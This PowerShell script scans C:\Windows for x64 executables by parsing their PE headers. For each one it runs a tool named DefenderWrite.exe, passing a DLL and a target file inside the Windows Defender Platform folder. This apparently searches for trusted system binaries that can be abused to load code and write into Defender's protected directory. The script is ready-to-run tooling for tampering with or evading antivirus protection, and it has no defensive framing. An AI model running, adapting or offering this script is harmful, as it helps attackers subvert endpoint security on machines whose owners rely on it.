# Function: Is-ExeX64
# Returns $true when the file is a PE image for x64 (IMAGE_FILE_MACHINE_AMD64 = 0x8664)
function Is-ExeX64 {
    param(
        [Parameter(Mandatory=$true)][string]$Path
    )

    if (-not (Test-Path $Path -PathType Leaf)) { return $false }

    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    } catch {
        return $false
    }

    try {
        $br = New-Object System.IO.BinaryReader($fs)

        # DOS header: e_lfanew at offset 0x3C (4 bytes, little-endian)
        $fs.Seek(0x3C, [System.IO.SeekOrigin]::Begin) | Out-Null
        $e_lfanew = $br.ReadInt32()

        if ($e_lfanew -le 0 -or $e_lfanew -gt $fs.Length - 4) { return $false }

        # Verify PE signature "PE\0\0"
        $fs.Seek($e_lfanew, [System.IO.SeekOrigin]::Begin) | Out-Null
        $peSig = $br.ReadBytes(4)
        if ($peSig[0] -ne 0x50 -or $peSig[1] -ne 0x45 -or $peSig[2] -ne 0x00 -or $peSig[3] -ne 0x00) { return $false }

        # Read IMAGE_FILE_HEADER.Machine (2 bytes, little-endian)
        $machine = $br.ReadUInt16()

        # IMAGE_FILE_MACHINE_AMD64 = 0x8664
        return ($machine -eq 0x8664)
    } catch {
        return $false
    } finally {
        $br.Close()
        $fs.Close()
    }
}

# Define the root path and the excluded folder
$rootPath = "C:\Windows"
$excludedPaths = @("C:\Windows\WinSxS", "C:\Windows\SysWOW64")

# Get all .exe files excluding specified folders
$exeFiles = Get-ChildItem -Path $rootPath -Recurse -Filter *.exe -File -ErrorAction SilentlyContinue |
    Where-Object {
        $fullPath = $_.FullName
        $excludedPaths -notcontains ($excludedPaths | Where-Object { $fullPath.StartsWith($_) })
    }

# Loop and run only x64 executables
foreach ($exe in $exeFiles) {
    $exePath = $exe.FullName
    if (Is-ExeX64 -Path $exePath) {
        Write-Host "Running x64: $exePath"
        try {
            & "C:\TMP\DefenderWrite.exe" $exePath "C:\TMP\CheckDLL.dll" "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\wfile.txt"
        } catch {
            Write-Host "Failed to run: $exePath"
        }
    }
}
